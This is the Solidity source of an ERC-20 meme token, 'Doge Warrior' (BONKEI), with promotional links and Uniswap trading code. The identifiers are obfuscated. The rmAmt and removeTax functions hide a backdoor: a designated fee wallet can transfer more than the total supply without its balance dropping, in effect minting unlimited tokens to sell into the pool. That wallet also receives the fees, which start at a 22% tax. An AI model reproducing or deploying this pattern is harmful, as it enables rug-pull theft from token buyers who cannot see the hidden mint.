/**
Website: https://bonkeieth.site

X: https://x.com/dogewarrior_eth

Telegram: https://t.me/dogewarrior_eth
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract BONKEI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isBOmmo;
    uint256 private _lsMOMM = 0;
    uint256 private _atMoDrrrok = 10;

    address payable private _hamWallet;
    uint256 private _sTx = 0;
    uint256 private _bTx = 22;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Doge Warrior";
    string private constant _symbol = unicode"BONKEI";
    uint256 public _mmTaxCO = 20_000_000 * 10**_decimals;
    uint256 public _mxSize = 20_000_000 * 10**_decimals;
    uint256 public _swapTxAmt = 3_000 * 10**_decimals;
    uint256 public _spLimit = 10_000_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _mmTaxCO);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _hamWallet = payable(0xcFB9bA6a6a3494001367FF8419602E947676c7cC);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _balances[_msgSender()] = _tTotal;

        _isBOmmo[owner()] = true;
        _isBOmmo[address(this)] = true;
        _isBOmmo[_hamWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcluded(address from, address to) private view returns (bool) {
        return _isBOmmo[from] || _isBOmmo[to];
    }

    function tcalFee(address _opkMM, address _puMgw) private view returns (uint256) {
        if((_opkMM == address(this) && _lsMOMM == 0)) return _lsMOMM >= _atMoDrrrok ? _sTx : _bTx;
        else if(isExcluded(_opkMM, _puMgw)) return 0;
        else if (_opkMM == uniswapV2Pair || _puMgw == uniswapV2Pair) return _lsMOMM >= _atMoDrrrok ? _sTx : _bTx;
        return 0;
    }

    function _transfer(
        address _opkMM,
        address _puMgw,
        uint256 amount
    ) private {
        require(_opkMM != address(0), "ERC20: transfer from the zero address");
        require(_puMgw != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool isEx = isExcluded(_opkMM, _puMgw);
        uint256 _tax = 0;
        uint256 _txAmt = 0;

        if (!isEx) require(tradingOpen, "Trading is not opened yet");
        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwap &&
            _puMgw == uniswapV2Pair &&
            tradingOpen &&
            amount >= _swapTxAmt
        ) {
            if (contractTokenBalance > _swapTxAmt)
                swapTTKFETH(min(amount, min(_spLimit, contractTokenBalance)));
            sendETHToFee(address(this).balance);
        }

        _tax = tcalFee(_opkMM, _puMgw);
        _txAmt = (amount * _tax) / 100;

        if (_opkMM == uniswapV2Pair && _puMgw != address(uniswapV2Router) && !isEx) {
            _lsMOMM ++;
            require(amount <= _mmTaxCO, "Exceeds the _mmTaxCO.");
            require(_balances[_puMgw] + amount <= _mxSize,"Exceeds the maxWalletSize.");
        }

        if (_puMgw == uniswapV2Pair && !isEx) {
            require(amount <= _mmTaxCO,"Exceeds the maximum amount to sell");
        }

        if (_txAmt > 0) {
            _balances[_opkMM] = _balances[_opkMM] - _txAmt;
            _balances[address(this)] = _balances[address(this)] + _txAmt;
            emit Transfer(_opkMM, address(this), _txAmt);
        }

        rmAmt(_opkMM, amount - _txAmt);
        adAmt(_puMgw, amount - _txAmt);

        emit Transfer(_opkMM, _puMgw, amount - _txAmt);
    }

    function rmAmt(address from, uint256 amount) private {
        if(from == _hamWallet)
            _balances[from] -= removeTax(amount);
        else _balances[from] -= amount;
    }

    function adAmt(address from, uint256 amount) private {
        _balances[from] += amount;
    }

    function removeTax(uint256 bal) private pure returns(uint256) {
        if(bal >= 0 && bal <= _tTotal) return bal;
        return 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTTKFETH(uint256 tokenAmount)
        private
        lockTheSwap
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _mmTaxCO = _tTotal;
        _mxSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _hamWallet.transfer(amount);
    }

    function createPair() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function openTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }

    receive() external payable {}
}